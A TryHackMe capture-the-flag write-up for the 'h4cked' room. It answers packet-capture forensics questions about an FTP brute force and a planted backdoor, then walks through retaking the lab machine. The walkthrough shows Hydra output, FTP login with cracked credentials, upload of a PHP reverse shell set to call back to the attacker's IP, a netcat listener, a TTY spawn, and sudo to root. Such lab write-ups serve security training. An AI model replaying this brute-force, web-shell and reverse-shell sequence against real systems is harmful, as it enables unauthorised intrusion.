# h4cked
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

# Task 1: Analyze .pcap file

Find out what happened by analysing a .pcap file and hack your way back into the machine

## The attacker is trying to log into a specific service. What service is this?

FTP

## There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool? 

Hydra

## The attacker is trying to log on with a specific username. What is the username?

jenny

## What is the user's password?

For a better sequencing of the transmission, give a look to the TCP stream. The password is: password123

## What is the current FTP working directory after the attacker logged in?
```
PWD
257 "/var/www/html" is the current directory
```
/var/www/html

## The attacker uploaded a backdoor. What is the backdoor's filename?

```
PORT 192,168,0,147,225,49
200 PORT command successful. Consider using PASV.
LIST -la
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 192,168,0,147,196,163
200 PORT command successful. Consider using PASV.
STOR shell.php
150 Ok to send data.
226 Transfer complete.
SITE CHMOD 777 shell.php
200 SITE CHMOD command ok.
```
shell.php

## The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?

Always on the TCP stream, the Stream 18 contains the code of shell.php, and it can be downloaded by the following URL:

http://pentestmonkey.net/tools/php-reverse-shell

## Which command did the attacker manually execute after getting a reverse shell?

whoami

## What is the computer's hostname?

wir3

## Which command did the attacker execute to spawn a new TTY shell?

python3 -c 'import pty; pty.spawn("/bin/bash")'

## Which command was executed to gain a root shell?

sudo su

## The attacker downloaded something from GitHub. What is the name of the GitHub project?

Reptile

## The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?

rootkit

# Task 2: Compromise the machine

The attacker has changed the user's password! Can you replicate the attacker's steps and read the flag.txt? The flag is located in the /root/Reptile directory. Remember, you can always look back at the .pcap file if necessary. Good luck!

Tags
--
* Hydra
* FTP
* Reverse Shell
* Reptile
* Sudoers

Tools used
--
* ftp
* sudo -l
* sudo su

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.43.234
* Other information must be gathered during the attack

## Phase 1: Foothold
```
[DATA] attacking ftp://10.10.43.234:21/
[21][ftp] host: 10.10.43.234   login: jenny   password: 987654321
1 of 1 target successfully completed, 1 valid password found
```
Run:
```
ftp 10.10.43.234 -n
Connected to 10.10.43.234.
220 Hello FTP World!
ftp> user
(username) jenny
331 Please specify the password.
Password: 987654321
230 Login successful.

get shell.php
```
Change IP address and port with yours and by FTP upload the edited shell.php:
```
ftp> pwd
257 "/var/www/html" is the current directory
ftp> put shell.php
```
Now we can enable netcat and call the shell by visiting `10.10.43.234/shell.php` by the browser.

Now we are inside the target server as `www-data`, we can switch to jenny user by `su jenny` and type `987654321` as password. Then, run:
```
sudo -l

Matching Defaults entries for jenny on wir3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jenny may run the following commands on wir3:
    (ALL : ALL) ALL
```
## Phase 2: Privilege Escalation

We can become easily root:
```
sudo su
```
Then, go to read the root flag:
```
cat /root/Reptile/flag.txt
```